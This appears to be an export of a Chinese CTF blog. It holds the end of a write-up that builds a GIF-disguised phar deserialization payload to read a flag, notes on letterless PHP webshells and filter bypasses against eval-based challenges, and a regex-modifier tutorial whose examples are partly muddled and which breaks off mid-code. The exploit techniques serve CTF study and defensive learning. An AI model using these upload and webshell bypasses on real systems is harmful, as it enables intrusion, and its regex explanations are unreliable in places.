<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">else</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure></div>

<p>因此可以先随便上传一个txt，得到的路径中，<code>.txt</code> 前面的就是 <code>$_SESSION[&#39;user&#39;]</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrs6y5j30xl04m0ta.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrs6y5j30xl04m0ta.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;highlight_file(&quot;/var/www/html/flag.php&quot;);&#x27;</span>; <span class="comment">//里面的命令不要出现单引号否侧生成phar会报错</span></span><br><span class="line"><span class="variable">$o</span>-&gt;Filename = <span class="string">&#x27;test&#x27;</span>; </span><br><span class="line"><span class="variable">$o</span>-&gt;token = <span class="string">&#x27;GXY****************&#x27;</span>; <span class="comment">//$_SESSION[&#x27;user&#x27;]</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>

<p>然后将生成的phar上传</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/uploads/sandbox路径/GXYsession.txt</span><br><span class="line"></span><br><span class="line">Payload:</span><br><span class="line">home.php?file=upload&amp;name=phar:///var/www/html/uploads/sandbox路径/GXYsession.txt</span><br></pre></td></tr></table></figure></div>

<p>然后随便上传什么文件都会回显flag</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>无数字字母绕过 Bypass</title>
    <url>/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>很久以前做过安恒的题，最近遇到个差不多，来记录一下学习笔记<br>利用思路提出来自P神<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html">一些不包含数字和字母的 webshell</a></p>
<h1 id="漏洞核心"><a href="#漏洞核心" class="headerlink" title="漏洞核心"></a>漏洞核心</h1><ul>
<li>异或绕过 Bypass</li>
<li>取反绕过</li>
<li>不用数字构造出数字( 弱类型 <code>true 值为 1</code> -&gt; <code>true + true == 2</code> )</li>
</ul>
<h1 id="安恒的题型和变种"><a href="#安恒的题型和变种" class="headerlink" title="安恒的题型和变种"></a>安恒的题型和变种</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>具体参看 <a href="https://www.freebuf.com/articles/web/186298.html">P神的文章</a><br>以及 <a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/">微笑师傅的衍生操作</a></p>
<h1 id="ISITDTU-CTF-2019-EasyPHP"><a href="#ISITDTU-CTF-2019-EasyPHP" class="headerlink" title="ISITDTU CTF 2019 EasyPHP"></a>ISITDTU CTF 2019 EasyPHP</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>有点类似以前写的国赛的 <a href="https://www.suk1.top/2019/05/16/love_math/">love_math</a></p>
<p>正则匹配了一些字母和数字还有一些特殊符号。 具体调试正则 这里有个<a href="https://regex101.com/">工具网站</a></p>
<p>正则的意思是匹配 <code>\x00</code> 到 <code>空格(\x20)</code> 的字符， <code>0到9</code> 的数字、<code>&quot;$&amp;.,|[&#123;_defgops</code> 以及 <code>DEL（\x7f）</code> 字符。如果你提交的字符串出现上述字符，die。</p>
<p>第二个<code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code><br>表示我们提交的字符串一共不能出现多于 <strong>13种不同的字符</strong>。</p>
<p>允许出现的字符如下：<code>!#%()*+-/:;&lt;=&gt;?</code><br><code>@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</code></p>
<h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><p>看一下内置函数还有哪些能用</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$arr</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">bcmul, rtrim, trim, ltrim</span><br><span class="line">chr, link, unlink, tan</span><br><span class="line">atan, atanh, tanh, intval</span><br><span class="line">mail, min, max</span><br></pre></td></tr></table></figure></div>

<p>虽然引号都被过滤了，但是PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p>
<p>而且PHP调用函数，可以使用字符串调用。这个在当初 <a href="https://www.suk1.top/2020/02/05/GXY%E5%A5%97%E5%A8%83/">GXY禁止套娃</a> 有提到过</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" data-fancybox="group" data-caption="limit_webshell_1" class="fancybox"><img alt="limit_webshell_1" title="limit_webshell_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" class="lazyload"></a></p>
<p>注意到 <code>^</code> 符号没有被过滤，那么我们就可以通过对字符串进行运算来规避if了。</p>
<p>后面就是常规的异或解题</p>
<h2 id="相关的参考"><a href="#相关的参考" class="headerlink" title="相关的参考"></a>相关的参考</h2><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/">Tiaonmmn.ZMZ官方wp</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11520031.html">PHP代码审计，无字母数字webshell</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道题了解模式修正符</title>
    <url>/yakko117/2019/12/28/%E6%A8%A1%E5%BC%8F%E4%BF%AE%E6%AD%A3%E7%AC%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$num</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$str</span>)) &#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d+/sD&#x27;</span>,<span class="variable">$str</span>)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You play CTF like CXK!&quot;</span>; </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123; </span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Just because you&#x27;re beautiful!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span>You play CTF like CXK!</span><br></pre></td></tr></table></figure></div>

<p>题目挺简单的，数组绕过就可以了，Payload如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str[]=123&amp;num=123</span><br></pre></td></tr></table></figure></div>

<p>但是正则还是可以细品的</p>
<hr>
<h1 id="正则表达式-模式修正符"><a href="#正则表达式-模式修正符" class="headerlink" title="正则表达式 - 模式修正符"></a>正则表达式 - 模式修正符</h1><h2 id="修正符-i（ignore）"><a href="#修正符-i（ignore）" class="headerlink" title="修正符 i（ignore）"></a>修正符 i（ignore）</h2><p><code>i</code> 不区分大小写的匹配<br>“<code>/abc/i</code>“ 可以与 <code>abc</code> 或 <code>aBC</code> 或 <code>ABc</code> 等匹配。</p>
<h2 id="修正符-m-more-多行匹配"><a href="#修正符-m-more-多行匹配" class="headerlink" title="修正符 m(more) 多行匹配"></a>修正符 m(more) 多行匹配</h2><p>区分大小写<br>若存在换行 <code>\n</code>，并且开始使用 <code>^</code> 或 <code>$</code> 结束符号的情况下， 和 <code>g</code> 一起使用实现全局匹配，因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行， <code>g</code> 只匹配第一行，添加 <code>m</code> 之后实现多行，每个换行符之后就是开始</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^yakko/m&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;xiaohei</span></span><br><span class="line"><span class="string">yakkomana</span></span><br><span class="line"><span class="string">dsadsa&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">正则表达式/^yakko/m和字符串xiaohei yakkomana dsadsa匹配成功</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; yakko )</span><br></pre></td></tr></table></figure></div>

<p>回显成功。但是 <code>我们在使用模式修正符m的时候</code>，将<strong>匹配字符串</strong>看成是<code>多行而不是默认的单行</code>，所以<strong>任何一行只要是以 <code>abc</code> 开头</strong>，就匹配成功。但是，如果能匹配的行前面有空格的话，就不能匹配了!除非修改正则表达式的匹配模式。 </p>
<hr>
<h2 id="修正符-s"><a href="#修正符-s" class="headerlink" title="修正符 s"></a>修正符 s</h2><p>默认 <code>圆点.</code> 是匹配除 <code>换行符\n</code> 之外的任何单字符，加上 <code>s</code> 后 <code>.</code> 中包含换行符号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a.*c/s&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;dsadsaasd </span></span><br><span class="line"><span class="string">c&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">正则表达式/a.*c/s和字符串dsadsaasd  c匹配成功</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; adsaasd  c )</span><br></pre></td></tr></table></figure></div>

<p>去掉 <code>s</code> 后，匹配就是失败。</p>
<h2 id="修正符-g-global"><a href="#修正符-g-global" class="headerlink" title="修正符 g(global)"></a>修正符 g(global)</h2><p>全局匹配，如果不带 <code>g</code>，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"><span class="keyword">var</span> reg1 = <span class="string">&#x27;/a/&#x27;</span>;</span><br><span class="line">    str.<span class="keyword">match</span>(reg1); <span class="comment">// 结果为： aaaaaaaa</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg2 = <span class="string">&#x27;/a/g&#x27;</span>;</span><br><span class="line">    str.<span class="keyword">match</span>(reg2); <span class="comment">// 结果为: &quot;a&quot;, &quot;a&quot;, ...&quot;a&quot;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="修正符-x"><a href="#修正符-x" class="headerlink" title="修正符 x"></a>修正符 x</h2><p>将模式里的 <code>空格</code> 消除</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a c/x&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;a c&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">结果回显匹配失败</span><br></pre></td></tr></table></figure></div>

<p>因为使用模式修正符x取消了模式中的空格，<strong>但是无法使用模式修正符取消 <code>\s</code> 表示的空白。</strong></p>
<h2 id="模式修正符-A"><a href="#模式修正符-A" class="headerlink" title="模式修正符 A"></a>模式修正符 A</h2><p>强制从目标字符串开头匹配</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/ac/A&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;acahgyghvbm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">正则表达式/ac/A和字符串acahgyghvbm匹配成功</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; ac )</span><br><span class="line"></span><br><span class="line"><span class="variable">$mode</span>=<span class="string">&quot;/abc/A&quot;</span>。</span><br><span class="line">可以与 <span class="variable">$str</span>=<span class="string">&quot;abcsdfi&quot;</span> 匹配。</span><br><span class="line">不可以与 <span class="variable">$str2</span>=<span class="string">&quot;sdsdabc&quot;</span> 匹配。</span><br><span class="line">因为 <span class="variable">$str2</span> 不是以 abc 开头。</span><br></pre></td></tr></table></figure></div>

<p><strong>模式修正符Z</strong>表示的是以字符串结尾的匹配，和 <code>A</code> 的用法是一样的</p>
<hr>
<h2 id="正则匹配的贪婪模式"><a href="#正则匹配的贪婪模式" class="headerlink" title="正则匹配的贪婪模式"></a>正则匹配的贪婪模式</h2><p>在正则表达式中，有一种”贪婪模式”，贪婪模式的意思就是说，正则表达式默认会在查找到第一个匹配后，继续尝试后面的匹配，如果能找到匹配，则匹配最大的范围字符串。但有的时候这并不是我们想要的结果，所以我们需要取消贪婪模式。 <br>我们还是先看一个贪婪模式的例子： </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;b&gt;.*&lt;\/b&gt;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&lt;b&gt;welcome&lt;/b&gt; &lt;b&gt;to&lt;/b&gt; &lt;b&gt;phpfuns&lt;/b&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span 